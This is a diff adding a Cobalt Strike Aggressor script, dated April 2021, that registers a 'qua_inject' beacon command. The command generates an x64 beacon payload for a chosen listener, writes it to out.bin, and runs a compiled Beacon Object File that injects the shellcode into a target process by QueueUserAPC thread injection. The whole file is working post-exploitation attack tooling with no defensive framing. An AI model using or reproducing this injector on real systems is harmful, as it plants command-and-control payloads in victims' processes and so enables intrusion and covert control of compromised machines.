@@ -1,0 +1,56 @@
+# Chris Sikes
+# Apr 2021
+# $1 = beacon ID
+# $2 = process
+# x86_64-w64-mingw32-gcc -c qua_inject.c -o qua_inject.o
+
+
+alias qua_inject {
+	local('$bid $handle $data $pid $listener $payload');
+
+	# check our arguments
+	if (size(@_) != 3) {
+		berror($1, "qua_inject: not enough arguments. Enter the PID and Listener");
+		return;
+	}
+
+	# parse our arguments
+	$pid	= $2;
+	$listener = $3;
+
+	# Verify PID is a number
+	if ((!-isnumber $pid) || (int($pid) <= 0))
+	{
+		berror($1, "qua_inject: enter a valid PID");
+		return;
+	}
+
+	# read in our BOF file...
+	$handle = openf(script_resource("qua_inject.o"));
+	$data	= readb($handle, -1);
+	closef($handle);
+
+	if (listener_info($3) is $null)
+	{
+		berror($1, "Listener $3 is not found");
+	}
+	else
+	{
+    		# Generate a new payload 
+    		$payload = payload($3, "x64", "process");
+		$handle2 = openf(">out.bin");
+		writeb($handle2, $payload);
+		closef($handle2);
+   
+		# pack our arguments
+		$args	= bof_pack($1, "ib", $pid, $payload);
+
+		# announce to our user..
+		btask($1, "Injecting into PID $2");
+
+		# run a BOF
+		beacon_inline_execute($1, $data, "go", $args);
+	}
+}
+beacon_command_register("qua_inject", "QueueUserAPC injection method", "Synopsis: qua_inject [pid] [listener] \n\nAsynchronous procedure call to queue a specific thread.\nSuspend the thread, inject the shellcode, then resume the thread.");
+
